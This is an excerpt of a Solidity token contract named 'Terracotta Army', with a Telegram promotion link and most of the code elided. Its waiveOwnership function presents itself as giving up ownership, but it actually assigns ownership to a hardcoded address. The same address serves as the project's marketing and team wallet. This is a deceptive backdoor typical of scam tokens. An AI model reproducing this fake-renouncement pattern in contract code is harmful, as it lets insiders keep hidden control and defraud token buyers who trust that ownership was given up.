...
/**
Telegram : https://t.me/+WAJbTRKAduo2MmE0
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xD5ded3F5bE2f975dD0679771df3c63D5A9BcE377);
    }
...
contract TerracottaArmy is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Terracotta Army";
    string private _symbol = "Terracotta Army";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xD5ded3F5bE2f975dD0679771df3c63D5A9BcE377);
    address payable private teamWalletAddress = payable(0xD5ded3F5bE2f975dD0679771df3c63D5A9BcE377);
